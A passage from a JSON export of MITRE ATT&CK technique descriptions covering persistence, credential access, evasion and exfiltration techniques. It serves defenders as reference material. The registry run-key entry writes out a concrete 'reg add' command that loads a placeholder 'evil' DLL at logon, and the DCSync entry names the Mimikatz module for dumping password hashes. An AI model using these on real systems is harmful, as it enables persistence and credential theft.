organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet Remote Desktop Services)\", \"id\": \"attack-pattern--54a649ff-439a-41a4-9856-8d144a2551ba\"}, \"attack-pattern--4ab929c6-ee2d-4fb5-aab4-b14be2ed7179\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-24T19:00:32.917Z\", \"name\": \"Shortcut Modification\", \"attack_pattern_identifier\": \"T1547.009\", \"description\": \"Adversaries may create or edit shortcuts to run a program during system boot or user login. Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\\n\\nAdversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.\", \"modified\": \"2020-03-25T17:21:27.487Z\", \"id\": \"attack-pattern--4ab929c6-ee2d-4fb5-aab4-b14be2ed7179\"}, \"attack-pattern--ae676644-d2d2-41b7-af7e-9bed1b55898c\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:41.022Z\", \"name\": \"Data from Network Shared Drive\", \"attack_pattern_identifier\": \"T1039\", \"description\": \"Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information.\", \"modified\": \"2020-03-24T15:42:44.026Z\", \"id\": \"attack-pattern--ae676644-d2d2-41b7-af7e-9bed1b55898c\"}, \"attack-pattern--32901740-b42c-4fdd-bc02-345b5dc57082\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-05T16:27:37.784Z\", \"name\": \"Code Signing\", \"attack_pattern_identifier\": \"T1553.002\", \"description\": \"Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) The certificates used during an operation may be created, acquired, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates) Unlike [Invalid Code Signature](https://attack.mitre.org/techniques/T1036/001), this activity will result in a valid signature.\\n\\nCode signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing) \\n\\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system. \", \"modified\": \"2020-02-10T19:51:01.601Z\", \"id\": \"attack-pattern--32901740-b42c-4fdd-bc02-345b5dc57082\"}, \"attack-pattern--d63a3fb8-9452-4e9d-a60a-54be68d5998c\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-31T12:35:36.479Z\", \"name\": \"File Deletion\", \"attack_pattern_identifier\": \"T1070.004\", \"description\": \"Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\\n\\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native [cmd](https://attack.mitre.org/software/S0106) functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. (Citation: Trend Micro APT Attack Tools)\", \"modified\": \"2020-03-29T21:34:16.209Z\", \"id\": \"attack-pattern--d63a3fb8-9452-4e9d-a60a-54be68d5998c\"}, \"attack-pattern--774a3188-6ba9-4dc4-879d-d54ee48a5ce9\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:29.458Z\", \"name\": \"Automated Exfiltration\", \"attack_pattern_identifier\": \"T1020\", \"description\": \"Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. \\n\\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).\", \"modified\": \"2020-10-22T02:24:54.881Z\", \"id\": \"attack-pattern--774a3188-6ba9-4dc4-879d-d54ee48a5ce9\"}, \"attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-11T14:49:36.954Z\", \"name\": \"Malicious File\", \"attack_pattern_identifier\": \"T1204.002\", \"description\": \"An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\\n\\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) on the file to increase the likelihood that a user will open it.\\n\\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\", \"modified\": \"2020-03-11T14:55:56.177Z\", \"id\": \"attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e\"}, \"attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-01-30T16:18:36.873Z\", \"name\": \"Use Alternate Authentication Material\", \"attack_pattern_identifier\": \"T1550\", \"description\": \"Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \\n\\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\\n\\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\\u2014either in memory or on disk\\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\\n\", \"modified\": \"2020-09-16T19:40:44.714Z\", \"id\": \"attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814\"}, \"attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-23T22:02:48.566Z\", \"name\": \"Registry Run Keys / Startup Folder\", \"attack_pattern_identifier\": \"T1547.001\", \"description\": \"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \\\"run keys\\\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\\n\\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\\\Users\\\\[Username]\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup</code>. The startup folder path for all users is <code>C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp</code>.\\n\\nThe following run keys are created by default on Windows systems:\\n\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run</code>\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce</code>\\n* <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run</code>\\n* <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce</code>\\n\\nRun keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a \\\"Depend\\\" key with RunOnceEx: <code>reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnceEx\\\\0001\\\\Depend /v 1 /d \\\"C:\\\\temp\\\\evil[.]dll\\\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\\n\\nThe following Registry keys can be used to set startup folder items for persistence:\\n\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\User Shell Folders</code>\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Shell Folders</code>\\n* <code>HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Shell Folders</code>\\n* <code>HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\User Shell Folders</code>\\n\\nThe following Registry keys can control automatic startup of services during boot:\\n\\n* <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServicesOnce</code>\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServicesOnce</code>\\n* <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServices</code>\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServices</code>\\n\\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\\n\\n* <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\Run</code>\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\Run</code>\\n\\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Userinit</code> and <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Shell</code> subkeys can automatically launch programs.\\n\\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows</code> run when any user logs on.\\n\\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\\\System\\\\CurrentControlSet\\\\Control\\\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\\n\\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.\", \"modified\": \"2020-08-03T16:30:26.918Z\", \"id\": \"attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279\"}, \"attack-pattern--29be378d-262d-4e99-b00d-852d573628e6\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-06T20:57:37.959Z\", \"name\": \"System Checks\", \"attack_pattern_identifier\": \"T1497.001\", \"description\": \"Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors. \\n\\nSpecific checks may will vary based on the target and/or adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047), [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012) to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \\n\\nChecks could include generic system properties such as uptime and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. \\n\\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.(Citation: McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \\n \\nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.(Citation: Unit 42 OilRig Sept 2018)\", \"modified\": \"2020-07-01T16:32:02.514Z\", \"id\": \"attack-pattern--29be378d-262d-4e99-b00d-852d573628e6\"}, \"attack-pattern--ebb42bbe-62d7-47d7-a55f-3b08b61d792d\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2019-03-07T14:10:32.650Z\", \"name\": \"Domain Policy Modification\", \"attack_pattern_identifier\": \"T1484\", \"description\": \"Adversaries may modify the configuration settings of a domain to evade defenses and/or escalate privileges in domain environments. Domains provide a centralized means of managing how computer resources (ex: computers, user accounts) can act, and interact with each other, on a network. The policy of the domain also includes configuration settings that may apply between domains in a multi-domain/forest environment. Modifications to domain settings may include altering domain Group Policy Objects (GPOs) or changing trust settings for domains, including federation trusts.\\n\\nWith sufficient permissions, adversaries can modify domain policy settings. Since domain configuration settings control many of the interactions within the Active Directory (AD) environment, there are a great number of potential attacks that can stem from this abuse. Examples of such abuse include modifying GPOs to push a malicious [Scheduled Task](https://attack.mitre.org/techniques/T1053/005) to computers throughout the domain environment(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) or modifying domain trusts to include an adversary controlled domain where they can control access tokens that will subsequently be accepted by victim domain resources.(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks) Adversaries can also change configuration settings within the AD environment to implement a [Rogue Domain Controller](https://attack.mitre.org/techniques/T1207).\\n\\nAdversaries may temporarily modify domain policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.\", \"modified\": \"2021-01-11T19:48:37.680Z\", \"id\": \"attack-pattern--ebb42bbe-62d7-47d7-a55f-3b08b61d792d\"}, \"attack-pattern--0259baeb-9f63-4c69-bf10-eb038c390688\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:25.060Z\", \"name\": \"Screen Capture\", \"attack_pattern_identifier\": \"T1113\", \"description\": \"Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)\\n\", \"modified\": \"2020-03-24T19:56:37.627Z\", \"id\": \"attack-pattern--0259baeb-9f63-4c69-bf10-eb038c390688\"}, \"attack-pattern--4fe28b27-b13c-453e-a386-c2ef362a573b\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-03-15T16:03:39.082Z\", \"name\": \"Protocol Tunneling\", \"attack_pattern_identifier\": \"T1572\", \"description\": \"Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. \\n\\nThere are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.(Citation: SSH Tunneling) \\n\\n[Protocol Tunneling](https://attack.mitre.org/techniques/T1572) may also be abused by adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568). Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua JUL19) \\n\\nAdversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Protocol Impersonation](https://attack.mitre.org/techniques/T1001/003) to further conceal C2 communications and infrastructure. \", \"modified\": \"2020-03-27T17:15:35.372Z\", \"id\": \"attack-pattern--4fe28b27-b13c-453e-a386-c2ef362a573b\"}, \"attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2018-04-18T17:59:24.739Z\", \"name\": \"Indirect Command Execution\", \"attack_pattern_identifier\": \"T1202\", \"modified\": \"2020-06-20T22:09:22.559Z\", \"description\": \"Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts. (Citation: VectorSec ForFiles Aug 2017) (Citation: Evi1cg Forfiles Nov 2017)\\n\\nAdversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.\", \"id\": \"attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e\"}, \"attack-pattern--c2e147a9-d1a8-4074-811a-d8789202d916\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-05T14:28:16.719Z\", \"name\": \"Steganography\", \"attack_pattern_identifier\": \"T1027.003\", \"description\": \"Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.\\n\\n[Duqu](https://attack.mitre.org/software/S0038) was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.(Citation: Wikipedia Duqu) \\n\\nBy the end of 2017, a threat group used\\u202f<code>Invoke-PSImage</code>\\u202fto hide [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands in an image file (.png) and execute the code on a victim's system. In this particular case the [PowerShell](https://attack.mitre.org/techniques/T1059/001) code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.(Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)  \", \"modified\": \"2020-09-16T19:24:20.350Z\", \"id\": \"attack-pattern--c2e147a9-d1a8-4074-811a-d8789202d916\"}, \"attack-pattern--79da0971-3147-4af6-a4f5-e8cd447cd795\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-10-01T00:44:23.935Z\", \"name\": \"Virtual Private Server\", \"attack_pattern_identifier\": \"T1583.003\", \"description\": \"Before compromising a victim, adversaries may rent Virtual Private Servers (VPSs)\\u00a0that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.\\n\\nAcquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.(Citation: TrendmicroHideoutsLease)\", \"modified\": \"2020-10-22T17:58:32.476Z\", \"id\": \"attack-pattern--79da0971-3147-4af6-a4f5-e8cd447cd795\"}, \"attack-pattern--47f2d673-ca62-47e9-929b-1b0be9657611\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-31T12:42:44.103Z\", \"name\": \"Timestomp\", \"attack_pattern_identifier\": \"T1070.006\", \"modified\": \"2020-03-29T21:39:46.724Z\", \"description\": \"Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\\n\\nTimestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)\", \"id\": \"attack-pattern--47f2d673-ca62-47e9-929b-1b0be9657611\"}, \"attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-02T19:05:18.137Z\", \"name\": \"Spearphishing Attachment\", \"attack_pattern_identifier\": \"T1566.001\", \"description\": \"Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.\\n\\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.\", \"modified\": \"2020-10-18T01:52:25.316Z\", \"id\": \"attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597\"}, \"attack-pattern--3d333250-30e4-4a82-9edc-756c68afc529\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-02-21T20:22:13.470Z\", \"name\": \"Impair Defenses\", \"attack_pattern_identifier\": \"T1562\", \"description\": \"Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.\\n\\nAdversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components.\", \"modified\": \"2020-10-19T16:31:35.249Z\", \"id\": \"attack-pattern--3d333250-30e4-4a82-9edc-756c68afc529\"}, \"attack-pattern--d157f9d2-d09a-4efa-bb2a-64963f94e253\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-03-10T18:23:06.482Z\", \"name\": \"System Services\", \"attack_pattern_identifier\": \"T1569\", \"description\": \"Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services. Many services are set to run at boot, which can aid in achieving persistence ([Create or Modify System Process](https://attack.mitre.org/techniques/T1543)), but adversaries can also abuse services for one-time or temporary execution.\", \"modified\": \"2020-06-08T23:28:29.250Z\", \"id\": \"attack-pattern--d157f9d2-d09a-4efa-bb2a-64963f94e253\"}, \"attack-pattern--1cec9319-743b-4840-bb65-431547bce82a\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-10-01T01:42:24.974Z\", \"name\": \"Digital Certificates\", \"attack_pattern_identifier\": \"T1587.003\", \"description\": \"Before compromising a victim, adversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).\\n\\nAdversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Man-in-the-Middle](https://attack.mitre.org/techniques/T1557) if added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)).\", \"modified\": \"2020-10-22T18:18:08.422Z\", \"id\": \"attack-pattern--1cec9319-743b-4840-bb65-431547bce82a\"}, \"attack-pattern--0c4b4fda-9062-47da-98b9-ceae2dcf052a\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-14T13:35:32.938Z\", \"name\": \"Sharepoint\", \"attack_pattern_identifier\": \"T1213.002\", \"description\": \"Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:\\n\\n* Policies, procedures, and standards\\n* Physical / logical network diagrams\\n* System architecture diagrams\\n* Technical system documentation\\n* Testing / development credentials\\n* Work / project schedules\\n* Source code snippets\\n* Links to network shares and other internal resources\\n\", \"modified\": \"2020-03-24T16:41:00.821Z\", \"id\": \"attack-pattern--0c4b4fda-9062-47da-98b9-ceae2dcf052a\"}, \"attack-pattern--7bd9c723-2f78-4309-82c5-47cad406572b\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-03-10T17:28:11.747Z\", \"name\": \"Dynamic Resolution\", \"attack_pattern_identifier\": \"T1568\", \"description\": \"Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.\\n\\nAdversaries may use dynamic resolution for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)\", \"modified\": \"2020-10-02T01:37:39.938Z\", \"id\": \"attack-pattern--7bd9c723-2f78-4309-82c5-47cad406572b\"}, \"attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-17T19:13:50.402Z\", \"name\": \"Windows Service\", \"attack_pattern_identifier\": \"T1543.003\", \"description\": \"Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry. Service configurations can be modified using utilities such as sc.exe and [Reg](https://attack.mitre.org/software/S0075). \\n\\nAdversaries may install a new service or modify an existing service by using system utilities to interact with services, by directly modifying the Registry, or by using custom tools to interact with the Windows API. Adversaries may configure services to execute at startup in order to persist on a system.\\n\\nAn adversary may also incorporate [Masquerading](https://attack.mitre.org/techniques/T1036) by using a service name from a related operating system or benign software, or by modifying existing services to make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used. \\n\\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002). \", \"modified\": \"2020-09-16T15:49:58.490Z\", \"id\": \"attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32\"}, \"attack-pattern--f303a39a-6255-4b89-aecc-18c4d8ca7163\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-11T18:45:34.293Z\", \"name\": \"DCSync\", \"attack_pattern_identifier\": \"T1003.006\", \"description\": \"Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller using a technique called DCSync.\\n\\nMembers of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data(Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)(Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098).(Citation: InsiderThreat ChangeNTLM July 2017)\\n\\nDCSync functionality has been included in the \\\"lsadump\\\" module in [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.(Citation: Microsoft NRPC Dec 2017)\", \"modified\": 